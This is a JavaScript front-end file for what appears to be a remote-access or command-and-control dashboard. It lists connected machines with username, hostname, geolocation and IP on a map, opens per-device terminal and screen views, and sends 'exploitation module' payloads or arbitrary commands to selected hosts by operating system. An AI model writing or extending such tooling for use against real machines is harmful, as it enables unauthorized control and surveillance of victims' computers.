// Initialize the map
const map = L.map("map").setView([39.8283, -98.5795], 4); // Centered on the USA

// Add OpenMapTiles layer
L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
  maxZoom: 19,
  attribution: "© OpenStreetMap contributors",
}).addTo(map);

function deepEqual(obj1, obj2) {
  return JSON.stringify(obj1) === JSON.stringify(obj2);
}

if (!show_logout_button) {
  document.querySelector('li > a[href="/logout"]').parentElement.style.display = 'none';
}

function parseAndFormatTime(dateString) {
  // Parse the dateString in the given format "%Y-%m-%d-%H-%M-%S"
  const dateParts = dateString.split("-");

  // Extract individual components
  const year = dateParts[0];
  const month = parseInt(dateParts[1], 10) - 1; // JavaScript months are 0-based
  const day = dateParts[2];
  const hour = dateParts[3];
  const minute = dateParts[4];
  const second = dateParts[5];

  // Create a new Date object as UTC
  const date = new Date(Date.UTC(year, month, day, hour, minute, second));

  // Convert the UTC date to local time
  const formattedTime = date.toLocaleString(); // Automatically converts to local time

  return formattedTime;
}

old_data = {};
// Function to update the table and map with new data
async function updateDevices() {
  try {
    const response = await fetch("/devices", { method: "POST" });
    const data2 = await response.json();
    if (response.status != 200) {
      console.log(data2)
      showPopupAlert("An error occurred : "+data2.result, 'error')
    }
    const data = data2.result
    if (!deepEqual(data, old_data)) {
      old_data = data;

      const tableBody = document.getElementById("device-table");
      tableBody.innerHTML = ""; // Clear existing table rows

      Object.keys(data).forEach((clientId) => {
        const clientData = data[clientId];

        const osType = clientData.platform[0];
        const osLogo =
          osType === "Linux"
            ? "https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg"
            : osType === "Darwin"
            ? "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
            : osType === "Windows"
            ? "https://upload.wikimedia.org/wikipedia/commons/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg"
            : osType === "FreeBSD"
            ? "https://upload.wikimedia.org/wikipedia/commons/4/40/Daemon-phk.svg"
            : osType === "OpenBSD"
            ? "https://upload.wikimedia.org/wikipedia/commons/a/ad/Puffy.jpg"
            : osType === "Solaris"
            ? "https://upload.wikimedia.org/wikipedia/commons/d/d2/Icon-sun-solaris_os.svg"
            : osType === "Android"
            ? "https://upload.wikimedia.org/wikipedia/commons/2/26/Android_Robot_Head_2023.svg"
            : "https://static-00.iconduck.com/assets.00/unknown-os-20px-icon-512x512-brbzte7w.png"; // Default logo for other/unknown OS

        try {
          // Add a marker to the map
          L.marker([
            clientData.geolocation.latitude,
            clientData.geolocation.longitude,
          ])
            .addTo(map)
            .bindPopup(
              `<b>${clientData.username}</b><br>${clientData.hostname}`
            )
            .openPopup();
        } catch {
          ("Unable to locate geolocaction");
        }

        // Add a row to the table
        const row = document.createElement("tr");
        if (private_public) {ip_state = clientData.private_ip} else {ip_state = clientData.public_ip}
        image_url = 'https://upload.wikimedia.org/wikipedia/commons/1/1b/Microsoft_Fluent_UI_%E2%80%93_ic_fluent_wifi_off_24_regular.svg'
        if (clientData.status == "Online") {
          image_url = 'https://upload.wikimedia.org/wikipedia/commons/4/4d/Microsoft_Fluent_UI_%E2%80%93_ic_fluent_wifi_1_24_filled.svg'
        }
        time = "Now"
        if (clientData.last_online != "now") {
          time = parseAndFormatTime(clientData.last_online)
        }
        row.innerHTML = `
                  <td><input type="checkbox" class="row-select" data-row-id="${clientId}"></td>
                  <td>${clientData.username}</td>
                  <td>${clientData.geolocation.address}</td>
                  <td>${clientData.status}&nbsp; <img src='`+image_url+`' alt='Online/Offline Logo'</td>
                  <td>${time}</td>
                  <td><img src="${osLogo}" type="os" alt="${osType}">${osType}</td>
                  <td>${ip_state}</td>
                  <td><img src='https://upload.wikimedia.org/wikipedia/commons/6/6f/Octicons-terminal.svg' id='connect' alt="Connect icon" class='terminal-icon' data-row-id="${clientId}"></td>
                  <td><img src='https://upload.wikimedia.org/wikipedia/commons/0/0c/NotoSans_-_Screen_-_1F5B5.svg' class='connect-icon' alt='Connect Screen' id='screen' data-row-id="${clientId}"></td>
                  <td><img src='https://upload.wikimedia.org/wikipedia/commons/9/9c/Trash-can_-_Delapouite_-_game-icons.svg' class='trashcan-icon' alt='Delete icon' id='delete' data-row-id="${clientId}"></td>
              `;
        tableBody.appendChild(row);
      });
    }
  } catch (error) {
    console.error("Error fetching data:", error);
  }
}

// Call updateDevices to initially load the data
updateDevices();

setInterval(updateDevices, 1000);

function send_pem() {
  const dropdown = document.getElementById("pem-dropdown");
  const selectedOption = dropdown.options[dropdown.selectedIndex]; // Get the selected <option>
  console.log(selectedOption); // Check if it's correctly pointing to the selected option

  // Fallback to checking the standard 'path' attribute if 'path_mine' doesn't exist
  path = selectedOption.getAttribute("path");
  console.log(path); // Final value of the path

  const checkboxes = document.querySelectorAll(".row-select");

  // Create an array to store the IDs of selected rows
  const selectedElements = [];

  // Loop through the checkboxes
  checkboxes.forEach((checkbox) => {
    // Check if the checkbox is checked
    if (checkbox.checked) {
      // Add the row ID to the selectedElements array
      selectedElements.push(checkbox.dataset.rowId);
    }
  });

  // Send the request
  fetch("/explotation_module", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      explotation_module: dropdown.value,
      uids: selectedElements,
      input: document.getElementById("pem-input").value,
      path: path,
    }),
  })
    .then(async (response) => {
      const data = await response.json();
      if (response.status != 200) {
        showPopupAlert("An error occurred : "+data.result, 'error')
      } else {
        showPopupAlert(data.result, "success")
      }
      updateDevices();
    })
    .catch((error) => {
      console.error("Error sending delete request:", error);
    });
}

// Add event listeners for connect and delete icons
document.addEventListener("click", (event) => {
  if (event.target.id === "connect") {
    const rowId = event.target.dataset.rowId;
    console.log(`Connect clicked for device ID: ${rowId}`);
    window.location.href = "/terminal/" + rowId;
    // Add logic to handle connect event here
  } else if (event.target.id === "delete") {
    const rowId = event.target.dataset.rowId;
    fetch("/delete", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ device_id: rowId }),
    })
      .then(async (response) => {
        const data = await response.json();
        if (response.status != 200) {
          showPopupAlert("An error occurred : "+data.result, 'error')
        } else {
          showPopupAlert(data.result, "success")
        }
      })
      .catch((error) => {
        console.error("Error sending delete request:", error);
        showPopupAlert("An error occurred : "+error, 'error')
      });
  } else if (event.target.id === "screen") {
    const rowId = event.target.dataset.rowId;
    console.log(`Connect clicked for device ID: ${rowId}`);
    window.location.href = "/screen/" + rowId;
  }
});

document
  .getElementById("select-all-os")
  .addEventListener("change", function () {
    const isChecked = this.checked;
    document.querySelectorAll(".row-select").forEach((checkbox) => {
      checkbox.checked = isChecked;
    });
  });

document.getElementById("select-osx").addEventListener("change", function () {
  const isChecked = this.checked;
  document.querySelectorAll(".row-select").forEach((checkbox) => {
    const rowId = checkbox.dataset.rowId;
    const row = document
      .querySelector(`[data-row-id="${rowId}"]`)
      .closest("tr");
    console.log(row.children);
    const osType = row.querySelector("td:nth-child(6)").innerText.trim(); // Get OS type from the table row

    // Check if the OS matches the selected ones
    if (osType.includes("Darwin")) {
      checkbox.checked = isChecked;
    }
  });
});

document.getElementById("select-linux").addEventListener("change", function () {
  const isChecked = this.checked;
  document.querySelectorAll(".row-select").forEach((checkbox) => {
    const rowId = checkbox.dataset.rowId;
    const row = document
      .querySelector(`[data-row-id="${rowId}"]`)
      .closest("tr");
    console.log(row.children);
    const osType = row.querySelector("td:nth-child(6)").innerText.trim(); // Get OS type from the table row

    // Check if the OS matches the selected ones
    if (osType.includes("Linux")) {
      checkbox.checked = isChecked;
    }
  });
});

document
  .getElementById("select-windows")
  .addEventListener("change", function () {
    const isChecked = this.checked;
    document.querySelectorAll(".row-select").forEach((checkbox) => {
      const rowId = checkbox.dataset.rowId;
      const row = document
        .querySelector(`[data-row-id="${rowId}"]`)
        .closest("tr");
      console.log(row.children);
      const osType = row.querySelector("td:nth-child(6)").innerText.trim(); // Get OS type from the table row

      // Check if the OS matches the selected ones
      if (osType.includes("Windows")) {
        checkbox.checked = isChecked;
      }
    });
  });

const pem_dropdown = document.getElementById("pem-dropdown");
const pem_input = document.getElementById("pem-input");
const pem_windows = document.getElementById("pem-windows");
const pem_linux = document.getElementById("pem-linux");
const pem_osx = document.getElementById("pem-osx");
// Function to update architecture dropdown
function updateOSIcons() {
  // Get the selected payload option
  const selected_option = pem_dropdown.selectedOptions[0];
  
  // Get the OS info from the 'os' attribute of the selected option
  // Parse the string into an array using JSON.parse()
  const supported_os = JSON.parse(selected_option.getAttribute("os").replace(/'/g, '"'));

  // Initially hide all OS images
  pem_windows.style.display = "none";
  pem_linux.style.display = "none";
  pem_osx.style.display = "none";

  if (pem_dropdown.value === "send-command") {
    pem_input.style.display = "block";
  } else {
    pem_input.style.display = "none";
  }

  // Show the corresponding OS images based on the selected payload's OS support
  if (supported_os.includes("windows")) {
    pem_windows.style.display = "block";
  }
  if (supported_os.includes("linux")) {
    pem_linux.style.display = "block";
  }
  if (supported_os.includes("osx")) {
    pem_osx.style.display = "block";
  }
}

// Initial update of architecture dropdown
updateOSIcons();

// Add event listener to OS dropdown
pem_dropdown.addEventListener("change", updateOSIcons);


function showPopupAlert(message, type) {
  const popup = document.getElementById('popup-alert');
  const popupMessage = document.getElementById('popup-message');
  popupMessage.textContent = message;
  
  // Add the type class (success or error)
  popup.classList.remove('success', 'error');
  popup.classList.add(type);

  // Show the popup
  popup.style.display = 'block';

  // Hide the popup after 3 seconds or when OK is clicked
  setTimeout(() => {
    popup.style.display = 'none';
  }, 3000);
}

// Example usage of showPopupAlert
document.getElementById('popup-ok-btn').addEventListener('click', function () {
  const popup = document.getElementById('popup-alert');
  popup.style.display = 'none';
});

// Function to filter rows based on search input
function filterRows() {
  const deviceIdFilter = document.getElementById('device-id-search').value.toLowerCase();
  const locationFilter = document.getElementById('location-search').value.toLowerCase();
  const statusFilter = document.getElementById('status-search').value.toLowerCase();
  const lastOnlineFilter = document.getElementById('last-online-search').value.toLowerCase();
  const osFilter = document.getElementById('os-search').value.toLowerCase();
  const ipAddressFilter = document.getElementById('ip-address-search').value.toLowerCase();

  const tableRows = document.querySelectorAll('#device-table tr');
  tableRows.forEach((row) => {
    const deviceId = row.cells[1].textContent.toLowerCase();
    const location = row.cells[2].textContent.toLowerCase();
    const status = row.cells[3].textContent.toLowerCase();
    const lastOnline = row.cells[4].textContent.toLowerCase();
    const os = row.cells[5].textContent.toLowerCase();
    const ipAddress = row.cells[6].textContent.toLowerCase();

    // Check if the row matches the search filters
    if (
      deviceId.includes(deviceIdFilter) &&
      location.includes(locationFilter) &&
      status.includes(statusFilter) &&
      lastOnline.includes(lastOnlineFilter) &&
      os.includes(osFilter) &&
      ipAddress.includes(ipAddressFilter)
    ) {
      row.style.display = ''; // Show the row
    } else {
      row.style.display = 'none'; // Hide the row
    }
  });
}

// Add event listeners to the search input fields
document.getElementById('device-id-search').addEventListener('input', filterRows);
document.getElementById('location-search').addEventListener('input', filterRows);
document.getElementById('status-search').addEventListener('input', filterRows);
document.getElementById('last-online-search').addEventListener('input', filterRows);
document.getElementById('os-search').addEventListener('input', filterRows);
document.getElementById('ip-address-search').addEventListener('input', filterRows);
